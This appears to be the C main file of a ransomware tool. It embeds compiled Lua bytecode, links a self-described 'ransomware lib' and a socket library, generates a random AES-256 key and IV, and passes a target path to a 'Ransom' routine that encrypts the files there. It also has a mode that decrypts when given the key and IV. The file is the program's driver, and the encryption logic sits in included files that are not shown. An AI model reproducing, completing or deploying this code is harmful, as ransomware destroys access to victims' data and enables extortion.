#include "lua/lua.h"                // lua
#include "lua/lualib.h"
#include "lua/lauxlib.h"
#include "lfs/lfs.h"                // lua filesystem lib
#include "lfs/lfs.c"
#include "netlib/netlib.c"          // lua socket lib
#include "ransomlib/ransomlib.h"    // lua ransomware lib
#include "ransomlib/ransomlib.c"
#include <limits.h>                 // max path length
#include <string.h>                 // strlen

int main (int argc, char **argv) {
    if (argc != 2 && argc != 4)
        return printf(
          "usage to encrypt:\n  %s [path]\n"
          "usage to decrypt:\n  %s [path] [key] [iv]\n"
          ,argv[0], argv[0]
        );

    char
        *target                     = argv[1],
        key[AES_256_KEY_SIZE]       = {0},
        iv[AES_BLOCK_SIZE]          = {0},
        hex_key[AES_256_KEY_SIZE*2] = {0},
        hex_iv[AES_BLOCK_SIZE*2]    = {0};
    
    if (argc < 4) {
        RAND_bytes((unsigned char*)key, AES_256_KEY_SIZE);
        RAND_bytes((unsigned char*)iv, AES_BLOCK_SIZE);
        bytes_to_hexa((const unsigned char*)key, hex_key, AES_256_KEY_SIZE);
        bytes_to_hexa((const unsigned char*)iv, hex_iv, AES_BLOCK_SIZE);
    } else {
        if (strlen(argv[2]) != AES_256_KEY_SIZE*2 || strlen(argv[3]) != AES_BLOCK_SIZE*2)
            return printf("key/iv: wrong length\n");
        memcpy(hex_key, argv[2], AES_256_KEY_SIZE*2);
        memcpy(hex_iv, argv[3], AES_BLOCK_SIZE*2);
    }

    printf("[+] Starting\n");

    lua_State *L = luaL_newstate();
    luaL_openlibs(L);
    luaopen_lfs(L);
    luaopen_netlib(L);
    luaopen_ransomlib(L);
    if (luaL_loadbuffer(L, (const char*)luac_out, luac_out_len, "buffer lua") != 0)
        return printf("couldnt load: ransom.lua\n");

    lua_call(L, 0, 0);
    lua_getglobal(L, "Ransom");
    lua_pushstring(L, target);
    lua_pushlstring(L, hex_key, AES_256_KEY_SIZE*2);
    lua_pushlstring(L, hex_iv, AES_BLOCK_SIZE*2);
    if (lua_pcall(L, 3, 0, 0) != 0)
        return printf("[-] %s", lua_tostring(L, -1));

    printf("[+] Done\n");
}
